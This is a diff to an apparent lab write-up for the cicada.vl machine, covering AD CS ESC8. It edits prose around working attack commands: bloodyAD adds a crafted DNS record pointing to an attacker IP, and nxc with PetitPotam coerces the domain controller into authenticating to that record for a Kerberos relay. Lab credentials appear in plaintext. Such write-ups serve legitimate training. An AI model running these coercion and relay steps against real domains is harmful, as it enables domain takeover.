@@ -215,7 +215,7 @@ Certificate Templates                   : [!] Could not find any certificate tem
 #### ESC8
 
 
-To be able to perform the coercion for the domain controller to send a SMB request to our attacker device, we first need to create a DNS Record using bloodyAD
+To be able to perform the coercion for the domain controller to send a SMB request to our attacker device, we first need to create a DNS Record using bloodyAD. This is done to be able to relay kerberos authentication((more details)[https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx])
 ```
 $ bloodyAD -u Rosie.Powell -d cicada.vl -p Cicada123 -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.170
 ```
@@ -232,7 +232,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
                                        
 ```
 
-We coeerce the host to send 
+We coeerce the host to authenticate to our recently added DNS name.
 ```
 $ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p 'Cicada123' -k -M coerce_plus -o L=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA M=Petitpotam 
 SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
